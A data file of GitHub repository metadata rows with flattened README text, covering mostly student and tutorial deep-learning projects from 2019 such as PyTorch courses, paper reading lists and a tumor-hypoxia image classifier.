GitHubhttps github com ilkarman DeepLearningFrameworks onnxruntimeonnxruntimeinferenceONNX,2019-07-17T12:38:37Z,2019-07-18T09:56:18Z,Python,137996047,User,0,1,0,34,master,137996047,1,0,0,0,0,0,0
geekykant,DeepLearning-Pytorch,n/a,DeepLearning Pytorch Intro to Deep Learning on Pytorch by Facebook developing neural networks for accurate results amp precision improvements About PyTorch At a granular level PyTorch is a library that consists of the following components Component Description torch https pytorch org docs stable torch html a Tensor library like NumPy with strong GPU support torch autograd https pytorch org docs stable autograd html a tape based automatic differentiation library that supports all differentiable Tensor operations in torch torch jit https pytorch org docs stable jit html a compilation stack TorchScript to create serializable and optimizable models from PyTorch code torch nn https pytorch org docs stable nn html a neural networks library deeply integrated with autograd designed for maximum flexibility torch multiprocessing https pytorch org docs stable multiprocessing html Python multiprocessing but with magical memory sharing of torch Tensors across processes Useful for data loading and Hogwild training torch utils https pytorch org docs stable data html DataLoader and other utility functions for convenience Usually one uses PyTorch either as a replacement for NumPy to use the power of GPUs a deep learning research platform that provides maximum flexibility and speed Projects MNIST DIgits Classification https github com geekykant DeepLearning Pytorch tree master MNIST 20DIgits 20Classification Fashion MNIST Classification https github com geekykant DeepLearning Pytorch tree master Fashion 20MNIST 20Classification CIFAR10 Image Classification https github com geekykant DeepLearning Pytorch tree master CIFAR10 20Image 20Classification,2019-07-07T12:39:48Z,2019-08-18T18:45:08Z,Jupyter Notebook,geekykant,User,0,1,0,22,master,geekykant,1,0,0,0,0,0,0
devgunho,DeepLearning_Keras,n/a,keraslogo https user images githubusercontent com 41619898 62167853 0f366980 b35f 11e9 99c5 baa0b0a0a869 png http keras io CPU GPU API GAN Generative Adversarial Network Neural Turing Machine,2019-07-28T01:02:39Z,2019-08-19T21:29:39Z,Jupyter Notebook,devgunho,User,1,1,0,20,master,devgunho,1,0,0,0,0,0,0
Taro3,DeepLearning_Cpp,n/a,DeepLearningCpp Deep LearningC Qt EigenQtPythonC bitbucketgithub,2019-07-22T12:22:50Z,2019-08-29T10:21:36Z,C++,Taro3,User,0,1,0,32,master,Taro3,1,0,0,0,0,0,0
Arman-Berek,ImageClassifier-DeepLearning,n/a,AI Programming with Python Project Project code for Udacity s AI Programming with Python Nanodegree program In this project I first developed code for an image classifier built with PyTorch then converted it into a command line application train py Basic usage python train py datadirectory Prints out training loss validation loss and validation accuracy as the network trains Options Set directory to save checkpoints python train py datadir savedir savedirectory Choose architecture python train py datadir arch vgg13 Set hyperparameters python train py datadir learningrate 0 01 hiddenunits 512 epochs 20 Use GPU for training python train py datadir gpu predict py Basic usage python predict py path to image checkpoint Options Return top KK most likely classes python predict py input checkpoint topk 3 Use a mapping of categories to real names python predict py input checkpoint categorynames cattoname json Use GPU for inference python predict py input checkpoint gpu,2019-07-18T20:20:36Z,2019-09-27T18:01:34Z,HTML,Arman-Berek,User,0,1,0,9,master,Arman-Berek,1,0,0,0,0,0,0
kumquatninja,DeepLearning_Movies_CNN,n/a,,2019-07-30T02:36:29Z,2019-07-30T03:03:54Z,Jupyter Notebook,kumquatninja,User,1,1,0,24,master,kumquatninja#nn1,2,0,0,0,0,0,0
Pradhy729,DeepLearning.ai-coursework,n/a,DeepLearning ai coursework,2019-07-08T03:24:44Z,2019-08-13T16:14:46Z,Jupyter Notebook,Pradhy729,User,0,1,0,4,master,Pradhy729,1,0,0,0,0,0,0
VictorReaver1999,DeepLearningSpecialization,n/a,DeepLearningSpecialization My solutions to the deep learning specialization programming assignments I ll upload the weights files data sets and utils functions in time,2019-07-08T13:17:42Z,2019-07-09T04:24:16Z,Jupyter Notebook,VictorReaver1999,User,1,1,0,25,master,VictorReaver1999,1,0,0,0,0,0,6
NikolayOskolkov,DeepLearningMicroscopyImaging,n/a,,2019-07-07T18:33:26Z,2019-07-07T18:38:03Z,HTML,NikolayOskolkov,User,0,1,1,1,master,NikolayOskolkov,1,0,0,0,0,0,0
mahayat,DeepLearningResources,n/a,Deep Learning Papers List of papers I find interesting ImageNet Classification with Deep Convolutional Neural Networks http papers nips cc paper 4824 imagenet classification with deep convolutional neural networ 2012 boom Fully Convolutional Networks for Semantic Segmentation https arxiv org abs 1411 4038 2014 Generative Adversarial Networks https arxiv org abs 1406 2661 2014 Representation Learning A Review and New Perspectives https arxiv org abs 1206 5538 2014 Spatial Pyramid Pooling in Deep Convolutional Networks for Visual Recognition https arxiv org abs 1406 4729 2014 Siamese Neural Networks for One shot Image Recognition https www cs cmu edu rsalakhu papers oneshot1 pdf 2015 U Net Convolutional Networks for Biomedical Image Segmentation https arxiv org abs 1505 04597 2015 Batch Normalization Accelerating Deep Network Training by Reducing Internal Covariate Shift https arxiv org abs 1502 03167 2015 Is object localization for free Weakly supervised learning with convolutional neural networks https hal inria fr hal 01015140v2 document 2015 pencil2 Striving for Simplicity The All Convolutional Net https arxiv org abs 1412 6806 2015 From Image level to Pixel level Labeling with Convolutional Networks https arxiv org abs 1411 6228 2015 pencil2 A guide to convolution arithmetic for deep learning https arxiv org abs 1603 07285 2016 CAM http cnnlocalization csail mit edu ZhouLearningDeepFeaturesCVPR2016paper pdf 2016 pencil2 3D U Net Learning Dense Volumetric Segmentation from Sparse Annotation https arxiv org abs 1606 06650 2016 NIPS 2016 Tutorial Generative Adversarial Networks https arxiv org abs 1701 00160 2016 Densely Connected Convolutional Networks https arxiv org abs 1608 06993 2017 Grad CAM https arxiv org abs 1610 02391 2017 pencil2 On Large Batch Training for Deep Learning Generalization Gap and Sharp Minima https arxiv org abs 1609 04836 2017 Don t Decay the Learning Rate Increase the Batch Size https arxiv org abs 1711 00489 2017 Stronger generalization bounds for deep nets via a compression approach https arxiv org abs 1802 05296 2018 Few Shot Adversarial Learning of Realistic Neural Talking Head Models https arxiv org abs 1905 08233 2019 DCU Net https doi org 10 1364 BOE 10 003484 2019 Portals deeplearning ai https www deeplearning ai fast ai https www fast ai OpenAI https openai com DeepAI https deepai org ONNX https onnx ai The Carpentries https carpentries org Books PDFs Deep Learning Ian Goodfellow and Yoshua Bengio http www deeplearningbook org Deep learning with PyTorch https pytorch org assets deep learning Deep Learning with PyTorch pdf Interpretable Machine Learning https christophm github io interpretable ml book Reinforcement Learning An Introduction https web stanford edu class psych209 Readings SuttonBartoIPRLBook2ndEd pdf Algorithms for Reinforcement Learning https sites ualberta ca szepesva papers RLAlgsInMDPs lecture pdf Mathematics for Machine Learning Marc Deisenroth https mml book github io book mml book pdf Mathematics for machine Learning Garrett Thomas http gwthomas github io docs math4ml pdf The Matrix Calculus You Need For Deep Learning https arxiv org abs 1802 01528 VIP AI 101 CHEATSHEET http www montreal ai ai4all pdf Critique Deep Learning A Critical Appraisal https arxiv org abs 1801 00631 Websites Blogs distill https distill pub Nicolas Papernot https www papernot fr cleverhans blog http www cleverhans io Yufeng G https towardsdatascience com yufengg Lil Log https lilianweng github io lil log Programming The Python Standard Library https docs python org 3 library The Python Language Reference https docs python org 3 reference index html reference index multiprocessing https pymotw com 2 multiprocessing basics html Courses Videos Coursera https www coursera org Lagunita Stanford https lagunita stanford edu Mining of Massive Datasets http mmds org CS50 Harvard Web Programming with Python and JavaScript https www youtube com playlist list PLhQjrBD2T382hIW IsOVuXP1uMzEvmcE5 Ryan Tibshirani CMU https www stat cmu edu ryantibs teaching html Git Bash HPC Others The Linux Command Line https wiki lib sun ac za images c ca TLCL 13 07 pdf SAIL Stanford https cs stanford edu csdcf sail compute cluster PSU Singularity https www psc edu user resources software singularity UArk UArk GitLab https git uark edu UArk Nebula https nebula uark edu LinkedIn Learning https its uark edu linkedin login GitHub Markdown Help Basic writing and formatting syntax https help github com en articles basic writing and formatting syntax,2019-06-27T14:04:54Z,2019-12-05T18:25:12Z,n/a,mahayat,User,0,1,0,48,master,mahayat,1,0,0,0,0,0,0
crazymuse,DeepLearningOnCloud,n/a,DeepLearningOnCloud,2019-06-30T05:43:04Z,2019-07-06T08:28:14Z,Jupyter Notebook,crazymuse,User,0,1,0,4,master,crazymuse,1,0,0,0,0,0,0
YFW001,DeepLearningandCV,n/a,DeepLearning and CV assignment,2019-07-22T09:47:43Z,2019-07-22T13:23:28Z,Jupyter Notebook,YFW001,User,0,1,0,9,master,YFW001,1,0,0,0,0,0,0
AbnerCui,Python_DeepLearning_basic,n/a,Python,2019-07-13T07:55:39Z,2019-08-20T15:07:19Z,Jupyter Notebook,AbnerCui,User,0,1,0,5,master,AbnerCui,1,0,0,0,0,0,0
Akshina07,DeepLearning-TumorHypoxia,n/a,DeepLearning TumorHypoxia Transfer Learning on whole slide tumor images to classify tumors as hypoxic or non hypoxic For detailed procedure refer https github com Akshina07 DeepLearning TumorHypoxia wiki PROCEDURE FOLLOWED BACKGROUND Many primary tumor subregions have low levels of molecular oxygen termed hypoxia Hypoxic tumors are at elevated risk for local failure and distant metastasis but the molecular hallmarks of tumor hypoxia remain poorly defined It is observed hypoxia is associated with elevated genomic instability hypoxic tumors exhibited characteristic driver mutation signatures and a widespread hypoxia associated dysregulation of microRNAs miRNAs across cancers Hypoxia may also be associated with elevated rates of chromothripsis allelic loss of PTEN and shorter telomeres Thus tumor hypoxia may drive aggressive molecular features across cancers and shape the clinical trajectory of individual tumors Therefore finding the correlation between cancer tumors and level of molecular oxygen can find potential targeted genes associated with hypoxia which can also be used to treat tumor types We applied deep learning techniques like transfer learning and deep k means clustering to classify tumors as hypoxic or non hypoxic on TCGA whole slide tumor type for breast cancer BRCA DATA COLLECTION Downloaded TCGA whole slide images from GDC data portal The patient cases considered were extracted from a previously conducted study on Molecular landmarks of tumor hypoxia across cancer type ref 1 Supplementary Table1 The pan cancer hypoxia scores were used to generate labels described in Labelling which were considered as the ground truth A total of 13031 wsi images were downloaded all tumor types and including associated images RESOURCES 1 LINK TO DATA https static content springer com esm art 3A10 1038 2Fs41588 018 0318 2 MediaObjects 415882018318MOESM3ESM txt DATA PRE PROCESSING Whole slide images are very large and can only be viewed using specially designed libraries or software The images were processed using a C library extension in python open slide python The slides were tiled into 299 X 299 pixels input size for input to ImageNet InceptionV3 in a non overlapping fashion such that tiles with more than 25 background were rejected On average 2000 tiles were generated per image The tiles were split into 3 sets train 70 validation set 15 and test set 15 making sure that tiles of a particular patient are completely contained in one of the three partitions LABELLLING Labelled the patient tumor slides using pan cancer hypoxia scores of all the signatures Buffahypoxiapancancerscore from resource 1 was used For each tumor type the displacement from the median of Z scores was calculated and scaled to the range 1 1 All the tumor with median scores greater than 0 were labelled as hypoxic and others as non hypoxic TRAINING AND EVALUTION Used two pre trained models Resnet50 and InceptionV3 for fine tuning and feature extraction respectively The transfer values of bottle neck values generated were used as input to a top up model used to classify into two classes hypoxic or non hypoxic The model evaluation metrics used were f1 scores auc scores and accuracy REFERNCES 1 https github com ncoudray DeepPATH 2 Nature article Molecular landmarks of tumor hypoxia across cancer types published on 14th January 2019 https www nature com articles s41588 018 0318 2 3 Nature article Classification and mutation prediction from nonsmall cell lung cancer histopathology images using deep learning published on 17th September 2018 https www nature com articles s41591 018 0177 5 4 Nature article Dermatologist level classification of skin cancer with deep neural networks published on 25th January 2017 https www nature com articles nature21056 5 https medium com sh tsang review inception v3 1st runner up image classification in ilsvrc 2015 17915421f77c 6 https towardsdatascience com understanding and coding a resnet in keras 446d7ff84d33 7 Predicting cancer outcomes from histology and genomics using convolutional networks published in PNAS on 27th March 2018 https www pnas org content 115 13 E2970 8 Structured Crowdsourcing Enables Convolutional Segmentation of Histology Images https www ncbi nlm nih gov pubmed 30726865 9 Precision histology how deep learning is poised to revitalize histomorphology for personalized cancer care https www nature com articles s41698 017 0022 1 10 The Digital Slide Archive A Software Platform for Management Integration and Analysis of Histology for Cancer Research https www ncbi nlm nih gov pubmed 29092945 11 Nature Review Deep learning new computational modelling techniques for genomics https www nature com articles s41576 019 0122 6 12 Deep learning detects virus presence in cancer histology https www biorxiv org content 10 1101 690206v1 13 https www learnopencv com keras tutorial transfer learning using pre trained models,2019-07-25T15:28:30Z,2019-07-25T20:02:33Z,Python,Akshina07,User,0,1,0,6,master,Akshina07,1,0,0,0,0,0,0
w-is-h,DeepLearningNLP,deep-learning#deep-learning-tutorial#health-informatics#nlp#recurrent-neural-networks#transformer#tutorial,The repo contains lectures and jupyter notebooks for the training sessions in Deep Learning for NLP Session Title Slides Jupyter notebooks 1 Introduction General Introduction https github com w is h DeepLearningNLP Medical blob master Session1 01 1 20 20General 20Introduction 20 pdf Introduction to ML DL ANN https github com w is h DeepLearningNLP Medical blob master Session1 01 2 20 20Introduction 20to 20MLDLANN pdf Linear Algebra https github com w is h DeepLearningNLP Medical blob master Session1 LinearAlgebraIntro ipynb 2 Neural Networks ANN Training Procedure https github com w is h DeepLearningNLP Medical blob master Session2 ANN 20 20Training 20Procedure pdf ANN https github com w is h DeepLearningNLP Medical blob master Session2 NeuralNetworksIntro ipynb 3 Neural Networks Overfitting and Dropout https github com w is h DeepLearningNLP Medical blob master Session3 Overfitting 20and 20Dropout pdf Sentiment Classification using ANNs https github com w is h DeepLearningNLP Medical blob master Session3 Sentimentclassification ipynb 4 Neural Networks Multiclass Metrics and Optimizers https github com w is h DeepLearningNLP Medical blob master Session4 Multiclass 2C 20Metrics 2C 20Optimizers 20 26 20Tips pdf Multiclass and Adam https github com w is h DeepLearningNLP Medical blob master Session4 Multiclass 26Adam ipynb Unbalanced Datasaets https github com w is h DeepLearningNLP Medical blob master Session4 Unbalanceddatasets ipynb Understanding the Model https github com w is h DeepLearningNLP Medical blob master Session4 Understandthemodel ipynb 5 Convolutional Networks Introduction to Session 5 https github com w is h DeepLearningNLP Medical blob master Session5 Intro 20to 20Session 205 pdf Representation Learning https github com w is h DeepLearningNLP Medical blob master Session5 Representation 20Learning pdf Edge detection using Convolutions https github com w is h DeepLearningNLP Medical blob master Session5 EdgedetectionConvolutions ipynb Agressive Tweets Classification with ANNs and CNNs https github com w is h DeepLearningNLP Medical blob master Session5 AgressiveTweetsClassificationANNandCNN ipynb 6 Recurrent Neural Networks RNN LSTM and GRU https github com w is h DeepLearningNLP Medical blob master Session6 Recurrent 20Neural 20Networks 20 pdf Agressive Tweets Classification with RNNs https github com w is h DeepLearningNLP Medical blob master Session6 AgressiveTweetsClassificationRNN ipynb 7 Entity Extraction and Language Modeling 8 Transfer Learning with RNNs LSTMs 9 Transformers 10 Transformers 11 Transformers BERT 12 Transformers huggingface 13 A use case from the ground up 14 A use case from the ground up,2019-07-02T12:47:18Z,2019-11-15T10:08:08Z,Jupyter Notebook,w-is-h,User,1,1,1,13,master,w-is-h,1,0,0,0,0,0,0
nani67,DeepLearningModel,deeplearning#keras#ml#neural-network#python,Deep Learning model using Keras This is a project of recognizing the output value or bit value out of the given 32 bits of information This was actually implemented to prevent a loooong time of searching for a larger dataset This project was created for my professor as a part of a website containing code samples like of GitHub for the college students developed by the college students How to run this Step 1 Install packages Keras Step 2 run the Python file belonging to training first It will create a h5 file Step 3 run the Python file belonging to test or implementation It will run the model which was saved before for prediction Thank you for visiting Happy Coding,2019-07-12T13:02:02Z,2019-12-09T14:48:55Z,Python,nani67,User,0,1,0,4,master,nani67,1,0,0,0,0,0,0
shawroad,DeepLearning-with-CV,n/a,DeepLearning with CV There are projects about CV I will summary skills which is some processing CV 1 MobileNet 1 1 MobileNetV1 https github com shawroad DeepLearning with CV blob master MobileNet mobilenetV1 py 1 2 MinimobileNet https github com shawroad DeepLearning with CV blob master MobileNet MiniMobileNet py 1 3 conv https github com shawroad DeepLearning with CV blob master MobileNet conv png,2019-07-09T11:20:54Z,2019-10-18T01:54:00Z,Python,shawroad,User,0,1,0,16,master,shawroad,1,0,0,0,0,0,3
anti-antares,DeepLearning_Project,n/a,DLMIMIC 11785 course project A brief introduction to this project poster Posterfinal png The data pipline pipelinev1 https user images githubusercontent com 14221210 54965012 1f6bb180 4f45 11e9 9f03 21d082eeb5f4 jpg The embedding model embeddingv1 https user images githubusercontent com 14221210 54965190 d1a37900 4f45 11e9 8141 47adff9a483f jpg The medicine prediction model medcinepredictionv1 https user images githubusercontent com 14221210 54965156 a456cb00 4f45 11e9 8a89 7055dee90eed jpg,2019-07-10T23:38:23Z,2019-07-11T07:29:17Z,Jupyter Notebook,anti-antares,User,0,1,0,41,master,jiefeixia#anti-antares#roycechan#zhsh2009,4,0,0,0,0,0,1
uttejh,DeepLearning_PyTorch,cnn#deep-learning#gpu#predicting-patterns#python3#pytorch#recurrent-networks#style-transfer#udacity#word2vec,Deep Learning with PyTorch This repository contains material related to Udacity s Deep Learning Nanodegree program It consists of a bunch of notebooks for various deep learning topics Built With PyTorch Python 3 Google Colab Table Of Contents Introduction to Neural Networks Introduction to Neural Networks implemented gradient descent and applied it to predicting patterns in student admissions data Sentiment Analysis with NumPy built sentiment analysis model predicting if some text is positive or negative Introduction to PyTorch built neural networks in PyTorch and used pre trained networks for state of the art image classifiers Convolutional Neural Networks Convolutional Neural Networks Visualized the output of layers that make up a CNN Defined and train a CNN for classifying MNIST data https en wikipedia org wiki MNISTdatabase a handwritten digit database that is notorious in the fields of machine and deep learning Also defined and trained a CNN for classifying images in the CIFAR10 dataset https www cs toronto edu kriz cifar html Transfer Learning used VGGnet to help classify images of flowers without training an end to end network from scratch Weight Initialization Explore how initializing network weights affects performance Style Transfer Extract style and content features from images using a pre trained network Implemented style transfer according to the paper Image Style Transfer Using Convolutional Neural Networks https www cv foundation org openaccess contentcvpr2016 papers GatysImageStyleTransferCVPR2016paper pdf by Gatys et al Defined appropriate losses for iteratively creating a target style transferred image of your own design Recurrent Neural Networks Intro to Recurrent Networks Time series Character level RNN implemented RNN in PyTorch for a variety of tasks Embeddings Word2Vec Implemented the Word2Vec model to find semantic representations of words for use in natural language processing Sentiment Analysis RNN Implemented a recurrent neural network that can predict if the text of a moview review is positive or negative Deploying a Model with AWS SageMaker Learnt to deploy pre trained models using AWS SageMaker TODO GAN Generative Adversarial Networks Projects Predicting Bike Sharing Patterns Face Generation TV Script Generation Dog Breed Classifier Acknowledgements Udacity Deep Learning Nano Degree Program,2019-08-06T15:39:58Z,2019-10-05T11:29:29Z,Jupyter Notebook,uttejh,User,1,1,0,36,master,uttejh,1,0,0,0,0,0,0
luanshiyinyang,DeepLearningProject,n/a,,2019-07-06T11:42:25Z,2019-11-17T04:51:04Z,Jupyter Notebook,luanshiyinyang,User,0,1,0,6,master,luanshiyinyang,1,0,0,0,0,0,0
RacleRay,DeepLearningFoundation,n/a,DeepLearningFoundation Neural network algorithmarchitecture and some materials numpy NeuralNetwork ipynb Table of Contents 1 2 3 4 5 BP 5 1 5 2 layer 5 3 BP 5 4 5 4 1 5 4 2 5 4 3 MNIST 5 4 4 5 4 4 1 Trainer 5 4 4 2 5 4 5 5 4 5 1 SGD 5 4 5 2 Momentum 5 4 5 3 Nesterov 5 4 5 4 Adagrad 5 4 5 5 Adadelta 5 4 5 6 RMSprop 5 4 5 7 Adam 5 4 5 8 Nadam Nesterov 5 4 5 9 AdaBound lr 5 4 6 5 4 6 1 5 4 6 2 MINIST 5 4 7 batchnorm 5 4 7 1 BNdropout 5 4 7 2 BN 5 4 8 L2Dropout 5 4 8 1 Trainer 5 4 8 2 Dropout 5 4 8 3 L2 6 Convolution 6 1 6 2 Pooling 6 3 ConvNet 6 4 filter 6 5 filter 7 Deepconvnet 7 1 8 RNN RNN LSTM ipynb 9 LSTM RNN LSTM ipynb BONUS Perceptron Perceptron ipynb BONUS buildNN ipynb CNNModelTensorFlow CNNmodeltensorflow TensorFlow1 6CNN Inception V3 naive resNet naive VGGNet naive MobileNet naive RNNTensorFlow RNNtensorflow batchembeddinglookupsoftmaxperplexityLM Seq2Seq attention LM Seq2Seq attention dynamicrnn padding statestate sequencemask paddingloss encoder bidirectionalrnn attention decoder whileloop inference decoder attentionencoder outputsencoder statedecoder decoder embeddingsoftmax TensorFlow TFtools Keras Slim EstimatorDataset ML DL MLAlgorithm SVM MLAlgorithm SVM py SVMdemomax w and min b s t y wx b 1 soft margindecision boundary VAE VAE DLkeraspytorch GAN GAN WGANCGANMNISTACGAN DCGANHaveFun repository ACGAN Pix2PixU netgan Capsule Net CapsNet Capsule Net 1 https github com naturomics CapsNet Tensorflow git 1 https github com XifengGuo CapsNet Pytorch MNIST,2019-07-03T05:27:35Z,2019-11-29T11:40:42Z,Jupyter Notebook,RacleRay,User,0,1,0,42,master,RacleRay,1,0,0,0,0,0,0
Darkprogrammerpb,DeepLearningProjects,n/a,DeepLearningProjects,2019-07-19T01:23:38Z,2019-12-10T07:22:09Z,Jupyter Notebook,Darkprogrammerpb,User,1,1,0,177,master,Darkprogrammerpb,1,0,0,0,0,0,0
koni114,keras_based_deepLearning,n/a,,2019-07-03T13:58:37Z,2019-08-06T13:21:13Z,Jupyter Notebook,koni114,User,0,1,0,15,master,koni114,1,0,0,0,0,0,0
kushtekriwal,DeepLearning-Coursera,n/a,,2019-07-19T17:05:19Z,2019-12-12T22:18:39Z,Jupyter Notebook,kushtekriwal,User,0,1,0,4,master,kushtekriwal,1,0,0,0,0,0,0
utkaln,DeepLearningAWS,n/a,DeepLearningAWS Deep Learning on AWS from NYC Summit 2019 Resources Resources https bit ly 2XxFBZQ Presentation Link https awstraining vstbridge com collection Video Overview https www youtube com embed jWWyKE5ApqI start 321 end 660 version 3 Supervised Learning vs Unsupervised Learning Unsupervised Learning has two key attributes Clustering and Dimensionality Reduction Dimenstionality Reduction Objective is called Reward to an agent who takes action to adapt to learn from the Environment,2019-07-10T13:06:09Z,2019-07-10T14:42:50Z,n/a,utkaln,User,2,1,0,4,master,utkaln,1,0,0,0,0,0,1
DemisEom,DeepLearning-From-Scratch,n/a,DeepLearningFromScratch,2019-07-18T04:54:39Z,2019-08-13T08:05:35Z,Jupyter Notebook,DemisEom,User,0,1,1,5,master,DemisEom,1,0,0,0,0,0,0
feeldyd,DeepLearningProject,n/a,DeepLearningProject,2019-07-04T07:10:17Z,2019-07-10T07:56:34Z,Python,feeldyd,User,1,1,0,7,master,feeldyd#JaepilChoi,2,0,0,0,0,0,0
brooks-builds,learning_deep_learning,n/a,,2019-07-19T12:42:27Z,2019-08-06T03:34:51Z,JavaScript,brooks-builds,Organization,1,1,0,15,master,BrooksPatton,1,0,0,0,0,0,0
NateKomodo,DeeperAI,n/a,,2019-07-05T13:16:29Z,2019-07-08T16:19:00Z,C#,NateKomodo,User,1,1,0,9,master,NateKomodo,1,0,0,1,0,0,0
CaesarXI,DeepLearningAndPaddleTutorial,n/a,Deep Learning And Paddle Tutorial it includes lesson1 Python basic lesson2 PaddlePaddle basic lesson3 Logistic classification with numpy and paddle lesson4 Shallow network with numpy and paddle lesson5 Deep network with numpy and paddle lesson6 Mnist with paddle lesson7 Recommend system with paddle lesson8 PaddlePaddleCloud lesson9 CTR lesson10 Parameter tuning,2019-07-03T03:19:27Z,2019-07-03T03:27:57Z,Jupyter Notebook,CaesarXI,User,0,1,0,129,master,Melon-Water#tanzhongyibidu#JeremyFu#hui233#tink2123#denglelaibh#will-am#weixing02,8,0,0,0,0,0,0
KhanHSB,AI_Object_Detection_deepLearning,n/a,AIObjectDetectionDeepLearning Object Detection for Collision Avoidance Demonstration Version Please feel free to utilize the code for your projects with proper citations This project is for demonstration purposes if you d like to use it commercially I ve built a much more refined and advanced version that is avaliable for download Please email me directly at haseebk73 gmail com Instructions 1 You will need to download the Yolo h5 file place it in the modelsdata directory and the yolo weights file and place it in the yolodata directory i wasn t able to upload them as they exceeded github s file size limitions 2 Please make sure you have all the dependencies installed for the models,2019-07-28T06:46:28Z,2019-08-04T22:11:07Z,Jupyter Notebook,KhanHSB,User,1,1,0,1,master,KhanHSB,1,0,0,0,0,0,0
pharoah,Applied-AI-with-DeepLearning,n/a,,2019-06-25T05:05:08Z,2019-08-15T16:09:55Z,Jupyter Notebook,pharoah,User,0,1,0,4,master,pharoah,1,0,0,0,0,0,0
OFRIN,DeepLearning_Papers_with_Code,n/a,DeepLearning Papers with My Code Basic MLP Code https github com OFRIN TensorflowMLP Exponential Moving Average Code https github com OFRIN TensorflowExponentialMovingAverage Training Techniques Group Normalization Paper https arxiv org pdf 1803 08494 pdf Code https github com OFRIN TensorflowGroupNormvsBatchNorm Batch Normalization Accelerating Deep Network Training by Reducing Internal Covariate Shift Paper https arxiv org pdf 1502 03167 pdf Code https github com OFRIN TensorflowGroupNormvsBatchNorm On the Variance of the Adaptive Learning Rate and Beyond RAdam Paper https arxiv org abs 1908 03265 Code Bag of Tricks for Image Classification with Convolutional Neural Networks Paper https arxiv org abs 1812 01187 Code ImageNet trained CNNs are biased towards texture increasing shape bias improves accuracy and robustness Paper https arxiv org abs 1811 12231 Code mixup Beyond Empirical Risk Minimization Paper https arxiv org abs 1710 09412 Code https github com OFRIN TensorflowMixUp AUGMIX A SIMPLE DATA PROCESSING METHOD TO IMPROVE ROBUSTNESS AND UNCERTAINTY Paper https arxiv org pdf 1912 02781v1 pdf Code Semi Supervised Learning MixMatch A Holistic Approach to Semi Supervised Learning Paper https arxiv org abs 1905 02249 Code https github com OFRIN TensorflowMixMatch S4L Self Supervised Semi Supervised Learning Paper https arxiv org abs 1905 03670 Code Unsupervised Data Augmentation for consistency training Paper https arxiv org abs 1904 12848 Code https github com OFRIN TenorflowUDA EnAET Self Trained Ensemble AutoEncoding Transformations for Semi Supervised Learning Paper https arxiv org abs 1911 09265 Code AutoML Efficient Neural Architecture Search via Parameter Sharing Paper https arxiv org abs 1802 03268 Code NAS FPN Learning Scalable Feature Pyramid Architecture for Object Detection Paper https arxiv org abs 1904 07392 Code EfficientDet Scalable and Efficient Object Detection Paper https arxiv org abs 1911 09070 Code Supervised Learning Classification Very Deep Convolutional Networks for Large Scale Image Recognition Paper https arxiv org abs 1409 1556 Code Deep Residual Learning for Image Recognition Paper https arxiv org abs 1512 03385 Code Aggregated Residual Transformations for Deep Neural Networks Paper https arxiv org abs 1611 05431 Code Densely Connected Convolutional Networks Paper https arxiv org abs 1608 06993 Code EfficientNet Rethinking Model Scaling for Convolutional Neural Networks Paper https arxiv org abs 1905 11946 Code MixConv Mixed Depthwise Convolutional Kernels Paper https bmvc2019 org wp content uploads papers 0583 paper pdf Code Weakly Supervised Learning Learning Deep Features for Discriminative Localization Paper https arxiv org abs 1512 04150 Code https github com OFRIN TensorflowLearningDeepFeaturesforDiscriminativeLocalization Detection Faster R CNN Towards Real Time Object Detection with Region Proposal Networks Paper https arxiv org pdf 1506 01497 pdf Code You Only Look Once Unified Real Time Object Detection Paper https arxiv org abs 1506 02640 Code https github com OFRIN TensorflowYOLOv1 YOLO9000 Better Faster Stronger Paper https pjreddie com media files papers YOLO9000 pdf Code https github com OFRIN TensorflowYOLOv2 YOLOv3 An Incremental Improvement Paper https pjreddie com media files papers YOLOv3 pdf Code SSD Single Shot MultiBox Detector Paper https arxiv org abs 1512 02325 Code https github com OFRIN TensorflowSSD Focal Loss for Dense Object Detection Paper https arxiv org abs 1708 02002 Code https github com OFRIN TensorflowRetinaNet Generalized Intersection over Union A Metric and A Loss for Bounding Box Regression Paper http openaccess thecvf com contentCVPR2019 papers RezatofighiGeneralizedIntersectionOverUnionAMetricandaLossforCVPR2019paper pdf Code https github com OFRIN TensorflowGIoU DSSD Deconvolutional Single Shot Detector Paper https arxiv org abs 1701 06659 Code https github com OFRIN TensorflowDSSD DSOD Learning Deeply Supervised Object Detectors from Scratch Paper https arxiv org abs 1708 01241 Code Objects as Points Paper https arxiv org abs 1904 07850 Code FCOS Fully Convolutional One Stage Object Detection Paper https arxiv org abs 1904 01355 Code https github com OFRIN TensorflowFCOS Finding Tiny Faces Paper https arxiv org abs 1612 04402 Code RetinaFace Single stage Dense Face Localisation in the Wild Paper https arxiv org abs 1905 00641 Code https github com OFRIN TensorflowRetinaFace Feature Selective Anchor Free Module for Single Shot Object Detection Paper https arxiv org abs 1903 00621 Code Rethinking ImageNet Pre training Paper https arxiv org abs 1811 08883 Code Objects as Points Paper https arxiv org abs 1904 07850 Code CornerNet Detecting Objects as Paired Keypoints Paper http openaccess thecvf com contentECCV2018 html HeiLawCornerNetDetectingObjectsECCV2018paper html Code CenterNet Keypoint Triplets for Object Detection Paper https arxiv org abs 1904 08189 Code FoveaBox Beyond Anchor based Object Detector Paper https arxiv org abs 1904 03797 Code Scale Aware Trident Networks for Object Detection Paper https arxiv org abs 1901 01892 Code Bag of Freebies for Training Object Detection Neural Networks Paper https arxiv org abs 1902 04103 Code Semantic Segmentation Fully Convolutional Networks for Semantic Segmentation Paper https arxiv org abs 1605 06211 Code https github com OFRIN TensorflowFCN ParseNet Looking Wider to See Better Paper https arxiv org abs 1506 04579 Code Rethinking Atrous Convolution for Semantic Image Segmentation Paper https arxiv org abs 1706 05587 Code Encoder Decoder with Atrous Separable Convolution for Semantic Image Segmentation Paper https eccv2018 org openaccess contentECCV2018 papers Liang ChiehChenEncoder DecoderwithAtrousECCV2018paper pdf Code Instance Segmentation YOLACT Real time Instance Segmentation Paper http openaccess thecvf com contentICCV2019 papers BolyaYOLACTReal TimeInstanceSegmentationICCV2019paper pdf Code Recognition FaceNet A Unified Embedding for Face Recognition and Clustering Paper https arxiv org abs 1503 03832 Code Tagging Deep Convolutional Ranking for Multilabel Image Annotation Paper https arxiv org abs 1312 4894 Code CNN RNN A Unified Framework for Multi label Image Classification Paper https arxiv org abs 1604 04573 Code Semantic Regularisation for Recurrent Image Annotation Paper https arxiv org abs 1611 05490 Code Multi label Triplet Embeddings for Image Annotation from User Generated Tags Paper https www semanticscholar org paper Multi label Triplet Embeddings for Image Annotation Seymour Zhang 64a0323adf55db3d3de20cc2a8176961548379f4 Code Fast Zero Shot Image Tagging Fast0Tag Paper https arxiv org abs 1605 09759 Code Deep Multiple Instance Learning for Zero shot Image Tagging Deep0Tag Paper https arxiv org abs 1803 06051 Code Improving Pairwise Ranking for Multi label Image Classification 